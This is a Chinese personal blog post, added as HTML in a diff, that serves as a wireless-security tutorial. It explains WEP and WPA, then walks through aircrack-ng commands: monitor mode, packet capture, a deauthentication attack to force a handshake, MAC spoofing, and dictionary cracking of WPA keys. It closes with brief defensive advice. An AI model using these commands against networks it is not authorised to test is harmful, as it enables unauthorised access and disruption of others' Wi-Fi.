@@ -1,0 +1,782 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  
+<head>
+  <meta charset="utf-8">
+  <meta name="author" content="johnscott" />
+  
+  
+  
+  <title>无线安全 | JohnScott1989的博客</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="网络安全,网络安全," />
+  
+
+  <script>
+    console.log('\n%c Hexo-theme-bmw v4.0 ' + '%c 🎉 https://github.com/dongyuanxin/theme-bmw 🎉\n' + '\n%c View demo online ' + '%c 🔍 https://godbmw.com/ 🔍  \n' , 'color: #fadfa3; background: #030307; padding:3px 0;', '', 'color: #fadfa3; background: #030307; padding:3px 0;', '');
+  </script>
+
+  
+    <meta name="description" content="超级帽子戏法的个人博客,主要记录复制粘贴过来的笔记,还有自己的一些心得体会">
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  
+<script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+  <body>
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">JohnScott1989</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a 
+              href="/"
+              target="_self"
+            >
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a 
+              href="/archives/"
+              target="_self"
+            >
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          
+            <a 
+              href="/categories/"
+              target="_self"
+            >
+              分类
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          
+            <a 
+              href="/tags/"
+              target="_self"
+            >
+              标签
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          
+            <a 
+              href="/friends/"
+              target="_self"
+            >
+              友链
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          
+            <a 
+              href="/about/"
+              target="_self"
+            >
+              关于
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="">
+          
+            <a href="javascript:void(0);" v-else>联系我</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a 
+                    href="https://github.com/liuxue5213" 
+                    target="_blank"
+                  >
+                    Github
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="https://www.zhihu.com/people/liuxue5213" 
+                    target="_blank"
+                  >
+                    知乎
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="http://weibo.com/liuxue5213" 
+                    target="_blank"
+                  >
+                    微博
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="https://www.douban.com/people/liuxue5213" 
+                    target="_blank"
+                  >
+                    豆瓣
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="/linkedin.com/in/liuxue5213" 
+                    target="_blank"
+                  >
+                    linkedin
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>无线安全</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2021-09-18
+    </span>
+    
+      <span>
+        分类 : 
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+            网络安全
+          </a>
+      </span>
+    
+    
+      <span>
+        浏览 : <span class="article-timer" data-identity="33无线安全"></span>
+      </span>
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <h2 id="无线安全"><a href="#无线安全" class="headerlink" title="无线安全"></a>无线安全</h2><h3 id="无线技术特点"><a href="#无线技术特点" class="headerlink" title="无线技术特点"></a>无线技术特点</h3><p>无线技术变化快，难度大<br>行业迅猛发展<br>互联网的重要入口<br>无线技术的边界模糊<br>无线信道简介</p>
+<h3 id="IEEE-802-11"><a href="#IEEE-802-11" class="headerlink" title="IEEE 802.11"></a>IEEE 802.11</h3><p>IEEE（Institute of Electrical and Electronics Engineers）:由通信航天生物电气电子等方面的科学家组成，目的是指定标准，指导行业技术的发展，目前成员近40万人</p>
+<p>IEEE 802.11 是 IEEE 802 标准委员会（IEEE 802 LAN/MAN Standards Committee）下属的无线局域网工作组，也指代由该组织制定的无线局域网标准</p>
+<h3 id="OSI"><a href="#OSI" class="headerlink" title="OSI"></a>OSI</h3><p>开放式系统互联意为开放式系统互联，把网络通信的工作分为 7 层</p>
+<p>物理层,数据链路层,网络层,传输层,会话层,表示层和应用层</p>
+<h3 id="无线网卡准备"><a href="#无线网卡准备" class="headerlink" title="无线网卡准备"></a>无线网卡准备</h3><p>外置USB无线网卡，免驱；<br>发送功率：远程连接<br>接收灵敏性：适当降低灵敏度，接收效果更佳<br>无线渗透，关键的关键时芯片厂家<br>Atheros 或 Realtek 芯片对渗透测试相对很稳定</p>
+<h3 id="无线信道"><a href="#无线信道" class="headerlink" title="无线信道"></a>无线信道</h3><p>每个协议都有不同的工作频段，如 802.11b/g标准工作在2.4g频段<br>一共14个子信道，中国有13个，不同地区不同<br>设备支持的整个频段 1,6,11  2,7,12  3,8,13  4,9,14</p>
+<p>无线路由器信道和对讲机的频道类似，其实一无线信号作为传输媒体的数据信号传送通道。无线路由器信道可以划分位 13 个，及 1-13，就相当于有 13 个传输数据的通道。信道其实可以理解为空间中的不同频段，所有无线设备：手机、电脑、无线路由器、收音机等等都是混杂在电磁波中，那彼此都对彼此的信号造成了干扰，所以后期规定不同设备只允许用特定的频段，这样大家都互不干扰，”和谐”存在空间中</p>
+<h3 id="无线安全类型"><a href="#无线安全类型" class="headerlink" title="无线安全类型"></a>无线安全类型</h3><p>无线安全类型：无加密/WEP/WPA、WPA2</p>
+<p>WEP：WEP 是 Wired Equivalent Privacy 的简称，有线等效保密（WEP）协议是对在两台设备间无线传输的数据进行加密的方式，用以防止非法用户窃听或侵入无线网络。不过密码分析学家已经找出<br>WEP 好几个弱点，因此在 2003 年被 Wi-Fi Protected Access (WPA) 淘汰，又在 2004 年由完整的IEEE 802.11i 标准（又称为 WPA2）所取代。</p>
+<p>WPA、WPA2: WPA（英语：Wi-Fi Protected Access），意即“Wi-Fi访问保护”，是一种保护无线网络（Wi-Fi）访问安全的技术标准。它是应研究者在前一代的有线等效加密（WEP）系统中找到的几个严重的弱点而产生的。当前广泛实现的有 WPA、WPA2 两个标准，WPA 实现了 IEEE 802.11i 标准的大部分，是在 802.11i 完备之前替代 WEP 的过渡方案。WPA 的设计可以用在所有的无线网卡上，但未必能用在第一代的无线接入点上。WPA2 具备完整的标准体系，但其不能被应用在某些旧型的网卡上。</p>
+<p>WPA和 WPA2 这两个标准都提供了不错的保全能力，但也都存在自己的问题：WPA 或 WPA2 一定要引导并且被选来代替 WEP 才能生效，但是在某些旧设备的安装指引或默认配置中，WEP 标准是默认选项</p>
+<h3 id="AIRCRACK-NG工具"><a href="#AIRCRACK-NG工具" class="headerlink" title="AIRCRACK-NG工具"></a>AIRCRACK-NG工具</h3><p>Aircrack-NG 是一个与 802.11 标准的无线网络分析有关的安全软件，主要功能有：网络侦测，数据包嗅探，WEP 和 WPA/WPA2-PSK 破解。Aircrack-ng 可以工作在任何支持监听模式的无线网卡上（设备列表请参阅其官方网站）并嗅探 802.11a，802.11b，802.11g 的数据</p>
+<p>Aircrack-NG是一个完整的工具来评估Wi-Fi网络安全套件，它专注于 WiFi 安全的不同领域：<br>监控：数据包捕获和导出数据到文本文件，以供第三方工具进一步处理<br>攻击：通过数据包注入回放攻击，去认证，伪造接入点等。<br>测试：检查 WiFi 卡和驱动程序的能力（捕捉和注入）<br>破解：WEP 和 WPA PSK（WPA 1 和 2）</p>
+<p>无线监听工具airmon-ng<br>用于在无线接口上启用和禁用监听模式；<br>从监控模式返回到托管模式；<br>在没有参数情况下输入 airmon-ng 命令将显示接口状态；<br>列出 / 杀死可以干扰的程序配合无线网卡操作；</p>
+<p>使用无线网卡流程<br>ifconfig<br>ifconfig -a<br>ifconfig wlan0 up 启动无线网卡</p>
+<p>iwconfig  查看网卡模式<br>airmon-ng 检查网卡信息，以及芯片信息<br>airmon-ng check 检查干扰进程</p>
+<p>许多过程会干扰airmon-ng，使用 check 选项可以查看干扰的进程，然后kill掉，因为它们会通过改变通道进行干扰，有时还会将接口恢复到托管模式</p>
+<p>airmon-ng start wlan0   启动网卡监听模式<br>iwconfig                查看网卡模式，变成了监听模式<br>iwlist wlan0 channel 查看网卡在哪个信道工作<br>airmon-ng stop wlan0 网卡关闭监听模式（monitor）</p>
+<p>抓包airodump-ng</p>
+<p>airodump-ng wlan0        这条命令就是开始用 wlan0 去扫描周边网络<br>airodump-ng wlan0 -c 1   -c 指定信道<br>airodump-ng wlan0 -c 1 –bssid MAC地址                bssid 指定无线网卡的 MAC 地址<br>airodump-ng wlan0 -c 1 –bssid MAC地址 -w test1       -w 抓取数据包</p>
+<p>airodump-ng wlan0 -c 1 –bssid 8C:DE:F9:EF:57:77</p>
+<p>BSSID       AP的MAC地址，AP指的是无线网络，也就是wifi<br>PWR         网卡接受到的信号强度，举例越近信号越强，范围0到-50信号特别好，-50到-75一般，到-130 就不行了，就会显示-1<br>RXQ         最近10秒成功接收的数据帧的百分比（数据帧，管理帧），只有在固定信道时才会出现，也就是说用-c 参数的时候就会有该选项</p>
+<p>Beacons     接收到此AP发送的beacon帧数量<br>#Data       抓到的数据帧数量（WEP 表示 IV 数量），包含广播数据帧<br>#/s         最近10秒内，每秒平均抓到的帧的数量<br>CH          信道号（从 beacon 帧），信道重叠时可能发现其他信道<br>MB          AP支持的最大速率<br>ENC         采用的无线安全技术 WEP,WPA,WPA2,OPEN<br>CIPHER      CCMP，目前最安全的加密套件，也有其他方式，TKIP,WEP40,WEP104</p>
+<p>AUTH        身份认证，PSK(个人),MGT(企业),OPEN,SKA<br>ESSID       无线网络名称，隐藏AP此值可能为空，airodump 从probe何association request帧中发现隐藏 AP，（隐藏无限名称，但是可以抓到名字的长度 length）<br>STATION     STA的MAC地址，STA指的是客户端，例如手机，电脑等<br>Lost        通过 sequence number 判断最近10秒STA发送丢失的数据包数量（管理帧，数据帧）<br>Probes      STA连接的ESSID名称</p>
+<p>注入包aireplay-ng<br>aireplay-ng 是 aircrack-ng 套件里的一款抓包工具，aireplay-ng 中集成了 10 种攻击方式</p>
+<p>Attack 0: Deauthentication              解除认证<br>Attack 1: Fake authentication           伪造身份验证<br>Attack 2: Interactive packet replay     交互式数据包重播<br>Attack 3: ARP request replay attack ARP 请求重播攻击<br>Attack 4: KoreK chopchop attack KoreK   斩杀攻击<br>Attack 5: Fragmentation attack          碎片攻击<br>Attack 6: Cafe-latte attack             咖啡拿铁攻击<br>Attack 7: Client-oriented fragmentation attack  面向客户的分片攻击<br>Attack 8: WPA Migration Mode WPA        迁移模式<br>Attack 9: Injection test                注射測試</p>
+<p>aireplay-ng<br>aireplay-ng -9 wlan0      -9测试注入包，看我们的网卡能不能发注入包</p>
+<p>ifconfig wlan0 down    把网卡先关闭状态，关闭后才可以修改网卡 MAC 地址<br>macchanger -m 48:72:65:65:6e:00 wlan0    修改 MAC 地址，改网卡地址是可以伪造自己的 MAC 地址给其他设备发无线包</p>
+<p>ifconfig wlan0 up        启用网卡<br>ifconfig                 看网卡MAC地址是否已经修改</p>
+<h3 id="WPA-WPA2密码破解"><a href="#WPA-WPA2密码破解" class="headerlink" title="WPA/WPA2密码破解"></a>WPA/WPA2密码破解</h3><p>WPA破解<br>只能暴力破解<br>消耗 CPU 资源<br>时间上的消耗<br>字典质量：网上共享字典、泄露密码、地区电话号码段、kali中自带的字典文件</p>
+<p>WPA PSK破解 注：开始前，我们的网卡一定要改为监听模式</p>
+<p>airodump-ng wlan0</p>
+<p>第一步：抓包<br>A 8C:DE:F9:EF:57:77<br>airodump-ng wlan0 –bssid 8C:DE:F9:EF:57:77 -c 2 -w wpa     -w保存抓包信息</p>
+<p>第二步：先打断客户端和AP的连接：让它们再次连接，就会发生握手信息；因为我们抓包，必须要抓到客户端例如手机，电脑连接到 AP 的握手包，才能进行破解<br>aireplay-ng -0 50 -a 8C:DE:F9:EF:57:77 -c 00:50:56:20:d3:ba wlan0<br>    -0  打断客户端和 AP 的连接，10 指的是打断的次数<br>    -a  AP 的 MAC 地址<br>    -c  客户端的 MAC 地址<br>ls wpa* 查看抓到的包信息</p>
+<p>握手包：指的是采用 WPA 加密方式的无线 AP 与无线客户端进行连接前的认证信息包握手包抓取</p>
+<ol>
+<li>当一个无线客户端与一个无线 AP 连接时，先发出连接认证请求（握手申请：您好！）</li>
+<li>无线 AP 收到请求以后，将一段随机信息发送给无线客户端（你是？）</li>
+<li>无线客户端将接受到的这段随即信息进行加密之后再发送给无线 AP（这是我的名片）</li>
+<li>无线 AP 检查加密的结果是否正确，如果正确则同意连接（原来是自己人）</li>
+</ol>
+<p>第三步：破解<br>aircrack-ng -w password.txt wpa-01.cap<br>    -w  指定的字典<br>    wpa-01.cap  抓包文件</p>
+<p>kali自带的常用字典路径   /usr/share/wordlists/<br>cat /usr/share/wordlists/ | wc -l   查看共有多少个字典数目</p>
+<h3 id="Fern-WIFI-Cracker界面化工具"><a href="#Fern-WIFI-Cracker界面化工具" class="headerlink" title="Fern WIFI Cracker界面化工具"></a>Fern WIFI Cracker界面化工具</h3><ol>
+<li>应用 =&gt; 无线攻击 =&gt; fern wifi cracker</li>
+<li>选择无线网卡</li>
+<li>点击scan for Access points</li>
+<li>发现AP列表，点击要破解的，配置字典</li>
+<li>点击key database查看破解的密码</li>
+</ol>
+<h3 id="无线防御"><a href="#无线防御" class="headerlink" title="无线防御"></a>无线防御</h3><ol>
+<li>路由器连接密码要复杂一点</li>
+<li>修改路由器管理后台的帐号和密码</li>
+<li>移动设备不要越狱不要ROOT，ROOT/越狱后的设备存在安全问题</li>
+<li>定期查看连接列表</li>
+<li>采用WPA/WPA2-PSK加密方式</li>
+</ol>
+    </div>
+  </div>
+  
+    <div class="copy-right">
+      <div class="markdown-body">
+        <blockquote>
+        
+        
+          本文作者 : JohnScott <br/>
+        
+        原文链接 : <a href="">https://github.com/liuxue5213/liuxue5213.github.io/2021/33%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/</a><br>
+        版权声明 : 本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+        </blockquote>
+      </div>
+    </div>
+  
+  
+  
+    <div class="social-share"
+  style="margin-top: -2rem"
+  data-wechat-qrcode-title="<p>微信扫一扫</p>"
+  data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>"
+   data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter" 
+  
+>
+  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
+</div>
+<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async>
+  
+
+  
+    <div id="reward">
+  
+    <p id="reward-meta">知识 & 情怀 | 二者兼得</p>
+  
+  <button id="reward-btn">
+    
+    <span>感谢您的关心</span>
+  </button>
+  <div id="reward-qrcode">
+    
+      <div class="reward-qrcode--container">
+        <img class="qrcode-img" src="/images/wechat.png" alt="微信扫一扫">
+        <p class="qrcode-meta">微信扫一扫</p>
+      </div>
+    
+      <div class="reward-qrcode--container">
+        <img class="qrcode-img" src="/images/alipay.png" alt="支付宝扫一扫">
+        <p class="qrcode-meta">支付宝扫一扫</p>
+      </div>
+    
+  </div>
+
+</div>
+
+<script>
+  (() => {
+    let button = document.querySelector('#reward-btn'),
+      qrcode = document.querySelector('#reward-qrcode'),
+      display = false;
+    
+    button.addEventListener('click', () => {
+      qrcode.style.display = display ? 'none' : 'block'
+      display = !display
+    }, false)
+  })()
+</script>
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+              #网络安全
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/2021/32%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/" target="_self">中间人攻击</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/2021/40%E9%82%8F%E8%BC%AF%E6%BC%8F%E6%B4%9E/" target="_self">邏輯漏洞</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz",
+      appKey: "6VNHrdDAu0JKJXxyMajHk6qD",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+  
+    <script defer>
+const valineAPI = (() => {
+  try {
+    AV.init("E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz", "6VNHrdDAu0JKJXxyMajHk6qD");
+  } catch(error) {}
+  const isExist = (identity) => {
+    identity = identity || getRealPath();
+    let query = new AV.Query('Timer');
+    return new Promise((resolve, reject) => {
+      query.equalTo("identity", identity);
+      query.find().then(results => {
+        resolve(results.length > 0);
+      }, error => reject(error));
+    })
+  }
+
+  const _get = (identity) => {
+    let query = null;
+    if(identity && identity instanceof Array){
+      let querys = [];
+      for(let i = 0; i < identity.length; ++i) {
+        querys[i] = new AV.Query('Timer');
+        querys[i].equalTo('identity', identity[i]);
+      }
+      query = AV.Query.or.apply(null ,querys);
+    } else {
+      identity = identity || getRealPath();
+      query = new AV.Query("Timer");
+      query.equalTo("identity", identity);
+    }
+
+    return new Promise((resolve, reject) => {
+      query.find()
+      .then(results => resolve(results))
+      .catch(error => reject(error))
+    })
+  }
+
+  const create = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let Todo = AV.Object.extend('Timer');
+      let todo = new Todo();
+      todo.set("times", 1);
+      todo.set("identity", identity);
+      todo.save().then(res => resolve(true), error => reject(error));
+    })
+  }
+
+  const update = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let query = new AV.Query('Timer');
+      query.equalTo("identity", identity);
+      query.find().then(todos => {
+        todos.forEach(todo => {
+          todo.set("times", todo.attributes.times + 1);
+        });
+        return AV.Object.saveAll(todos);
+      }).then(todos => resolve(true), error => reject(error));
+    })
+  }
+
+  return {
+    isExist,
+    _get,
+    update,
+    create
+  }
+})()
+
+const calcAndWriteTimes = () => {
+  let isPost = true;
+
+  let timerAllDOM = document.querySelectorAll(".article-timer");
+
+  if(isPost) {
+    let identity = timerAllDOM[0].getAttribute("data-identity");
+    valineAPI.isExist(identity)
+    .then(exist => {
+      if(exist) {
+        return valineAPI.update(identity);
+      }
+      return new Promise(resolve => resolve(true));
+    })
+    .then( succuess => valineAPI._get(identity))
+    .then( result => timerAllDOM[0].innerText = result[0].attributes.times)
+    .catch(error => console.log(error.message))
+    return ;
+  }
+
+  let timerDOMCache = {};
+
+  for(let timerDOM of timerAllDOM) {
+    let identity = timerDOM.getAttribute("data-identity");
+    if(timerDOMCache.hasOwnProperty(identity)){
+      timerDOMCache[identity].dom.push(timerDOM);
+    }else{
+      timerDOMCache[identity] = {
+        dom: [timerDOM],
+        times: undefined
+      };
+    }
+  }
+
+  let identities = Object.keys(timerDOMCache);
+  valineAPI._get(identities).then(results => {
+    for(let result of results) {
+      let {identity, times} = result.attributes;
+      timerDOMCache[identity].times = times;
+      timerDOMCache[identity].dom.map(item => item.innerText = times);
+    }
+    for(let identity of identities) {
+      if(timerDOMCache[identity].times){
+        continue;
+      }
+      timerDOMCache[identity].dom.map(item => item.innerText = 1);
+      valineAPI.create(identity);
+    }
+  }).catch(error => console.log(error.message))
+}
+
+if(true){
+  calcAndWriteTimes();
+}
+</script>
+   
+
+</div>
+
+
+      <footer>
+  <p class="site-info">
+    博客已萌萌哒运行<span id="time-to-now"></span><span class="my-face">(●'◡'●)ﾉ♥</span>
+    <br>
+    Theme - <a href="https://github.com/dongyuanxin/theme-bmw">BMW</a> | Made With 💗 | Powered by <a target="_blank" rel="noopener" href="https://godbmw.com/">GodBMW</a>
+    <br>
+    
+  </p>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2015, 0, 1).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+  </body>
+
+</html>
